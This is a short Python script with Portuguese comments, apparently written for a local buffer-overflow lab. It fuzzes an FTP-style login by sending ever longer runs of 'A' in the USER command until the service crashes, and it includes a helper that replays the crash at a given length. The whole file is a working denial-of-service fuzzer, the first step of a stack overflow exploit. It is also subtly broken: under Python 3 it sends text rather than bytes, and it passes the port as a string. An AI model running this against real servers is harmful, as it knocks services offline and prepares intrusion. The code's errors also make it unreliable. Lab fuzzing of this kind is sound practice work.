import socket
import time

#A ideia é ter um laboratorio local, isso por que o BoF vai causar um DoS durante o teste

def gerar_buffer():
    # o Buffer é uma lista que vai ter um crescimento X, por exemplo:
    # buffer = ['A', 'AA', 'AAA', ...]
    buffer = ['A']
    crescimento = 100

    #Fiz o crescimento ser 50 em 50 com uma repetição de 100 vezes pois para realizar o crash pode ser uns 5000 bytes
    while len(buffer) <= 100:
        buffer.append('A' * crescimento)
        crescimento += 50
    return buffer


def crachar(ip_alvo, porta_alvo):
    buffer = gerar_buffer()

    for item in buffer:
        #Esse print é para eu saber quantos bytes foram enviados para aplicação que fez o crash
        print(f"Fuzzing {len(item)} bytes")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip_alvo, porta_alvo))

        #Esse USER e PASS são assim pois a aplicação de teste recebe esses dados
        sock.recv(1024)
        sock.send("USER " + item + "\r\n")
        time.sleep(1)

        sock.recv(1024)
        sock.send("PASS senha\r\n")
        time.sleep(1)

        sock.send("QUIT\r\n")
        sock.close()

def validar_crash(ip_alvo, porta_alvo, bytes):
    buffer = "A" * bytes
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip_alvo, porta_alvo))

    sock.recv(1024)
    sock.send("USER " + buffer + "\r\n")
    time.sleep(1)

    sock.recv(1024)
    sock.send("PASS senha\r\n")
    time.sleep(1)

    sock.send("QUIT\r\n")
    sock.close()

def executar():
    ip = input("Entre com o IP: ")
    porta = input("Entre com a porta: ")

    crachar(ip, porta)

    #bytes = input("Bytes antes do crash: ")
    #validar_crash(ip, porta, bytes)